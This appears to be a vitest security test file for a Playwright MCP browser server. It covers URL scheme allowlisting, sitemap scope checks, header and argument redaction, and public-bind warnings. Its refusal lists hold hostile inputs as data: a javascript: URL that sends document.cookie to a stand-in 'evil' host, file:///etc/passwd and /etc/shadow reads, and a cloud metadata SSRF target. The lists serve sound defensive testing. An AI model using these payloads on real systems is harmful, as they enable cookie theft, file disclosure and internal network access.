import { describe, it, expect, vi } from 'vitest';
import { assertNavigableUrl } from '../src/tab.js';
import { resolveSitemapUrl } from '../src/tools/auditSite.js';
import { isSensitiveHeaderName } from '../src/tools/network.js';
import { redactSecretArgs } from '../src/sessionLog.js';
import { warnIfUnauthenticatedOnPublicHost } from '../src/mcp/http.js';

// Each block pins one boundary a tool argument, a scanned page or an HTTP
// client can push against, so a regression names the boundary it broke.

describe('navigation scheme allowlist', () => {
  it.each([
    'https://example.com/',
    'http://example.com/path?q=1',
    'about:blank',
    'data:text/html,<h1>hi</h1>',
    'HTTPS://EXAMPLE.COM/',
    '//example.com/protocol-relative',
    '/relative/path',
    'relative/path.html',
  ])('allows %j', url => {
    expect(() => assertNavigableUrl(url)).not.toThrow();
  });

  // file: is the one that turns browser_navigate into an arbitrary file read:
  // the tool returns a snapshot of whatever it loaded.
  it.each([
    'file:///etc/passwd',
    'FILE:///etc/passwd',
    '  file:///etc/shadow',
    'file://localhost/etc/passwd',
    'view-source:file:///etc/passwd',
    'filesystem:file:///persistent/x',
    'chrome://settings',
    'chrome-extension://abc/page.html',
    'devtools://devtools/bundled/inspector.html',
    'javascript:fetch("//evil/"+document.cookie)',
    'blob:https://example.com/uuid',
  ])('refuses %j', url => {
    expect(() => assertNavigableUrl(url)).toThrow(/Refusing to navigate/);
  });

  it('names the scheme it rejected so the caller can correct the argument', () => {
    expect(() => assertNavigableUrl('file:///etc/passwd')).toThrow(/"file:"/);
  });
});

describe('sitemapUrl scope validation', () => {
  const startUrl = new URL('https://example.com/docs/');

  // Unchanged from before the scope check: the default is resolved relative
  // to the start URL, not against the origin root.
  it('defaults to sitemap.xml resolved against the start URL', () => {
    expect(resolveSitemapUrl(undefined, startUrl, true, false))
        .toBe('https://example.com/docs/sitemap.xml');
    expect(resolveSitemapUrl(undefined, new URL('https://example.com/'), true, false))
        .toBe('https://example.com/sitemap.xml');
  });

  it('accepts a same-origin sitemap and resolves it against the start URL', () => {
    expect(resolveSitemapUrl('https://example.com/custom.xml', startUrl, true, false))
        .toBe('https://example.com/custom.xml');
    expect(resolveSitemapUrl('/other.xml', startUrl, true, false))
        .toBe('https://example.com/other.xml');
  });

  // The fetch carries the browser context's cookies and follows redirects, so
  // an unchecked value reached internal hosts as the signed-in user.
  it.each([
    'http://169.254.169.254/latest/meta-data/',
    'https://internal.corp/secrets.xml',
    'https://evil.example.net/sitemap.xml',
  ])('refuses out-of-scope %j', candidate => {
    expect(() => resolveSitemapUrl(candidate, startUrl, true, false))
        .toThrow(/outside the crawl scope/);
  });

  it.each([
    'file:///etc/passwd',
    'ftp://example.com/sitemap.xml',
  ])('refuses non-http(s) %j', candidate => {
    expect(() => resolveSitemapUrl(candidate, startUrl, true, false))
        .toThrow(/must use http/);
  });

  it('honours the caller widening the scope deliberately', () => {
    expect(resolveSitemapUrl('https://cdn.example.com/sitemap.xml', startUrl, true, true))
        .toBe('https://cdn.example.com/sitemap.xml');
    expect(resolveSitemapUrl('https://elsewhere.test/sitemap.xml', startUrl, false, false))
        .toBe('https://elsewhere.test/sitemap.xml');
  });

  it('rejects an unparseable sitemapUrl rather than fetching it', () => {
    expect(() => resolveSitemapUrl('http://[', startUrl, true, false)).toThrow(/Invalid sitemapUrl/);
  });
});

describe('sensitive header detection', () => {
  it.each([
    'authorization', 'Authorization', 'COOKIE', 'set-cookie', 'proxy-authorization',
    'x-api-key', 'x-auth-token',
    // Names the previous fixed list missed entirely.
    'x-csrf-token', 'x-xsrf-token', 'x-amz-security-token', 'x-goog-api-key',
    'x-functions-key', 'api-key', 'apikey', 'x-access-token', 'x-refresh-token',
    'x-session-token', 'www-authenticate', 'proxy-authenticate', 'x-client-secret',
  ])('redacts %j', name => {
    expect(isSensitiveHeaderName(name)).toBe(true);
  });

  it.each([
    'content-type', 'accept', 'user-agent', 'content-length', 'referer',
    'cache-control', 'x-request-id', 'server', 'date', 'etag',
  ])('leaves %j visible', name => {
    expect(isSensitiveHeaderName(name)).toBe(false);
  });
});

describe('session log argument redaction', () => {
  it('replaces typed text with a length-preserving placeholder', () => {
    expect(redactSecretArgs({ element: 'Password field', ref: 'e3', text: 'hunter2' }))
        .toEqual({ element: 'Password field', ref: 'e3', text: '<redacted, 7 characters>' });
  });

  it('redacts every value inside a fill_form field list', () => {
    const args = {
      fields: [
        { name: 'Email', type: 'textbox', ref: 'e1', value: 'a@b.c' },
        { name: 'Password', type: 'textbox', ref: 'e2', value: 's3cret!' },
      ],
    };
    expect(redactSecretArgs(args)).toEqual({
      fields: [
        { name: 'Email', type: 'textbox', ref: 'e1', value: '<redacted, 5 characters>' },
        { name: 'Password', type: 'textbox', ref: 'e2', value: '<redacted, 7 characters>' },
      ],
    });
  });

  it('redacts by argument name for tools that do not exist yet', () => {
    expect(redactSecretArgs({ apiKey: 'k', password: 'p', bearerToken: 't' }))
        .toEqual({
          apiKey: '<redacted, 1 characters>',
          password: '<redacted, 1 characters>',
          bearerToken: '<redacted, 1 characters>',
        });
  });

  it('leaves everything else intact so the log stays replayable', () => {
    const args = { url: 'https://example.com', maxPages: 5, sameOriginOnly: true, urls: ['a', 'b'], nothing: null };
    expect(redactSecretArgs(args)).toEqual(args);
  });

  it('does not choke on empty or primitive payloads', () => {
    expect(redactSecretArgs({})).toEqual({});
    expect(redactSecretArgs(undefined)).toBeUndefined();
    expect(redactSecretArgs('bare string')).toBe('bare string');
  });
});

describe('unauthenticated public bind warning', () => {
  const capture = () => {
    const messages: string[] = [];
    return { messages, log: (message: string) => messages.push(message) };
  };

  it.each(['0.0.0.0', '::', '192.168.1.10', 'example.com'])('warns when bound to %j', host => {
    const { messages, log } = capture();
    warnIfUnauthenticatedOnPublicHost(host, log);
    expect(messages.join('\n')).toMatch(/without authentication/);
  });

  it.each([undefined, 'localhost', '127.0.0.1', '127.0.0.5', '::1', 'app.localhost'])(
      'stays quiet on loopback %j', host => {
        const { messages, log } = capture();
        warnIfUnauthenticatedOnPublicHost(host, log);
        expect(messages).toEqual([]);
      });

  it('stays quiet on a public bind once a token is configured', () => {
    const previous = process.env.PLAYWRIGHT_MCP_HTTP_TOKEN;
    process.env.PLAYWRIGHT_MCP_HTTP_TOKEN = 'a-shared-secret';
    try {
      const { messages, log } = capture();
      warnIfUnauthenticatedOnPublicHost('0.0.0.0', log);
      expect(messages).toEqual([]);
    } finally {
      if (previous === undefined)
        delete process.env.PLAYWRIGHT_MCP_HTTP_TOKEN;
      else
        process.env.PLAYWRIGHT_MCP_HTTP_TOKEN = previous;
    }
  });

  it('defaults to writing the warning to stderr', () => {
    const stderr = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      warnIfUnauthenticatedOnPublicHost('0.0.0.0');
      expect(stderr).toHaveBeenCalledWith(expect.stringContaining('without authentication'));
    } finally {
      stderr.mockRestore();
    }
  });
});
